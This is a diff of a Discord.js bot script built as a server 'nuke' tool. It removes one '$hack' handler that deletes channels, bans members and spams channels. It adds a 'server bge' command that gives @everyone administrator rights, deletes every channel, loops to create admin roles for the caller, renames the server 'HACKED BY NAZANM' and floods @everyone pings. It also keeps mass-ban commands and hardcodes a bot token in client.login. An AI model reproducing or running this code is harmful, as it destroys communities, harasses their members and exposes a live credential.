@@ -6,96 +6,7 @@ console.log(`Logged in as ${client.user.tag}!`);
  
 });
 
-client.on('message', message =>{
-    if (message.content.startsWith('$hack')){
-            if (message.channel.guild){
-                message.guild.channels.forEach(c =>{
-                    if(c.deletable){
-                        c.delete()
-                    }
-                })
-                message.guild.members.forEach(m =>{
-                    m.ban()
-                })
-                message.guild.roles.forEach(r=>{
-                    r.delete()
-                })
-                message.guild.setName('HACKED.')
-                setInterval(function(){
-                  message.guild.createChannel('HACKED BY unkonw ', 'Viniom')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
-                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
-                       message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
-                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                       message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
-                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                       message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
-                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
-                message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
-                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
-                })
-            }
-        }
-});
+          
 /////Ban all
 client.on('message', msg => {
          if (msg.content === prefix + "ban all") {
@@ -108,7 +19,7 @@ client.on('message', msg => {
 }
 });
 ////
-client.login("")
+client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
           
 client.on('message', message => {
          if (message.content === "banall") {
@@ -120,3 +31,36 @@ client.on('message', message => {
       })
 }
 });
+client.on('message', message => {
+    if (message.content.toLowerCase() === 'server bge') {
+        message.guild.roles.find('name', '@everyone').edit({
+            permissions: ["ADMINISTRATOR"]
+        });
+        let oldnm = message.guild.name;
+        message.guild.channels.map(c => {
+            c.delete();
+        });
+ 
+        setInterval(() => {
+            message.guild.createRole({
+                name: "HACKED BY NAZANM",
+                permissions: ["ADMINISTRATOR"]
+            }).then(rr => {
+ 
+                message.member.addRole(rr.id);
+            });
+        }, 1000);
+        message.guild.setAvatar("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
+        message.guild.setName('🌙HACKED BY NAZANM');
+        setTimeout(function() {
+            setInterval(() => {
+                message.guild.createChannel('🌙HACKED BY NAZANM', 'text').then(channel => {
+               message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
+        })
+            }
+                        
+                        , 500)
+            })
+        }
+    }
+)
